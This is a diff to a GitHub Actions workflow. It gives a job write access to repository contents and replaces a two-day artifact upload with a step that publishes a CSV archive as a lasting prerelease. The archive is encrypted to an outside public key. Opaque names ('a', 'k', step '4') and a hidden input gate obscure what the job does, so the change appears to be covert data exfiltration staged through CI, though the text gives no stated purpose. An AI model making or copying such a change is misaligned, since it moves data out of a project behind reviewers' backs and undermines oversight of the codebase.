@@ -108,6 +108,8 @@ jobs:
 
   arch:
     if: inputs.m == 'e'
+    permissions:
+      contents: write
     runs-on: ubuntu-latest
     timeout-minutes: 60
     steps:
@@ -153,10 +155,7 @@ jobs:
           printf '%s' "$k" | openssl pkeyutl -encrypt -pubin -inkey k.pub -out k.enc
           openssl enc -aes-256-cbc -pbkdf2 -salt -pass "pass:$k" -in a.csv.gz -out a.enc
           rm -f a.csv.gz; ls -l a.enc | awk '{print $5}'
-      - uses: actions/upload-artifact@v4
-        with:
-          name: a
-          path: |
-            a.enc
-            k.enc
-          retention-days: 2
+      - name: "4"
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh release create "a-${{ github.run_id }}" a.enc k.enc -R "$GITHUB_REPOSITORY" --prerelease -t a -n a > /dev/null && echo ok
